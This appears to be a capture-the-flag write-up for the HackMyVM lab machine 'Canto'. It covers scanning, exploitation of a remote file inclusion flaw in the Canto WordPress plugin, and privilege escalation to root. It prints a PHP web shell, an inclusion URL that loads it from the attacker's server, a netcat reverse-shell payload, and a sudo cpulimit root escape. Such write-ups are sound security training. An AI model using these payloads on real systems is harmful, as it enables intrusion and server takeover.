---
{"dg-publish":true,"permalink":"/write-ups/hack-my-vm/canto/","tags":["CTF","write-up"]}
---


![Pasted image 20241202214247.png|300](/img/user/attachments/Pasted%20image%2020241202214247.png)

---
> [!INFO] Info about Canto
> Linux machine.

> [!FAQ]- Hints
> No Hints.

---
# Active reconnaissance
## Port scan
Executing a fast general scan to all ports.
```shell
sudo nmap TARGET_IP -n -p- -sS -Pn -vvv --open --min-rate 5000 -oN nmap_scan
```

```c
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

---
# Enumeration
Executing a deep scan with common scripts only to ports that we are interested.
```shell
sudo nmap TARGET_IP -sCV -p 22,80 -oN nmap_enum
```
## OS
Ubuntu, linux
## Port 22 - SSH
22/tcp open  ssh     OpenSSH **9.3p1** Ubuntu 1ubuntu3.3 (Ubuntu Linux; protocol 2.0)
## Port 80 - Apache
80/tcp open  http    **Apache** httpd **2.4.57** ((Ubuntu))
Using **PHP**
http-title: Canto
http-generator: **WordPress 6.5.3**
http-server-header: Apache/2.4.57 (Ubuntu)

Add IP to `/etc/hosts`
```shell
sudo echo "192.168.122.80 canto.hmv" | sudo tee -a /etc/hosts
```

![Pasted image 20241204111339.png|700](/img/user/attachments/Pasted%20image%2020241204111339.png)
### Fuzzing
```shell
ffuf -c -t 100 -u http://canto.hmvm/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -mc all -fc 404
```
I found the WordPress 1typical subdirectories
![Pasted image 20241204122039.png](/img/user/attachments/Pasted%20image%2020241204122039.png)

---
# Vulnerability analysis
## Port 80
### Wordpress
Run wpscan
```shell
wpscan --url http://canto.hmvm/ -e vp --api-token="55hrhgd.....9ohtf" --plugins-detection aggressive
```
![Pasted image 20241204132557.png](/img/user/attachments/Pasted%20image%2020241204132557.png)
`searchsploit` provided an exploit related with this vulnerability
![Pasted image 20241204170426.png](/img/user/attachments/Pasted%20image%2020241204170426.png)

---
# Exploitation
I test the CVE-2024-25096 provided from *wpscan*, but I had problems.
## CVE-2023-3452

> [!cite] NIST CVE-2023-3452
> The Canto plugin for WordPress is vulnerable to **Remote File Inclusion** in versions up to, and including, **3.0.4** via the 'wp_abspath' parameter. This allows unauthenticated attackers to include and **execute** arbitrary **remote code** on the server, provided that allow_url_include is enabled. **Local File Inclusion** is also possible, albeit less useful because it requires that the attacker be able to upload a malicious php file via FTP or some other means into a directory readable by the web server.

The exploit of *exploitdb* fails, so I decide to exploit it manually.

1. On the attacker machine, create a folder named `wp-admin` and PHP file into it
   ![Pasted image 20241204173950.png](/img/user/attachments/Pasted%20image%2020241204173950.png)
   Content of `admin.php`
   ```php
   <?php
	   echo shell_exec($_GET['cmd']);
   ?>
   ```
1. On the attacker, run a python HTTP server
   ```shell
   python -m http.server 4748
   ```
3. On the browser or Burpsuite
   ```php
http://canto.hmvm/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://192.168.122.192:4748&cmd=whoami
   ```
   ![Pasted image 20241204174806.png](/img/user/attachments/Pasted%20image%2020241204174806.png)
## Get a shell
If it works, we have some says to get a reverse shell.

I'll set a listener
```shell
rlwrap nc -lnvp 4747
```
In this case, I'll enter the browser and copy this (change the IPs and ports):
```php
http://canto.hmvm/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=http://192.168.122.192:4748&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.122.192%204747%20%3E%2Ftmp%2Ff
```
And we have a shell like `www-data`
![Pasted image 20241204180653.png](/img/user/attachments/Pasted%20image%2020241204180653.png)
I found a flag on the home, but a higher privilege is required to read it.

---
# Privilege escalation
On the home folder of `www-data` I check the `.bash_history`
![Pasted image 20241204181337.png|300](/img/user/attachments/Pasted%20image%2020241204181337.png)
Check the `txt` file and I found the credentials.
![Pasted image 20241204181609.png|400](/img/user/attachments/Pasted%20image%2020241204181609.png)
Login as *erik*
```shell
su erik
```
And enter the password
![Pasted image 20241204181802.png](/img/user/attachments/Pasted%20image%2020241204181802.png)
> [!check] User flag
> ![Pasted image 20241204182023.png](/img/user/attachments/Pasted%20image%2020241204182023.png)
## Get root
Check sudo permissions.
```shell
sudo -l
```
![Pasted image 20241204205037.png|700](/img/user/attachments/Pasted%20image%2020241204205037.png)
This can be exploited using *gtfobins*
![Pasted image 20241204205303.png|700](/img/user/attachments/Pasted%20image%2020241204205303.png)
```shell
sudo cpulimit -l 100 -f /bin/sh
```
![Pasted image 20241204205530.png](/img/user/attachments/Pasted%20image%2020241204205530.png)

> [!check] Root flag
> ![Pasted image 20241204205643.png](/img/user/attachments/Pasted%20image%2020241204205643.png)

---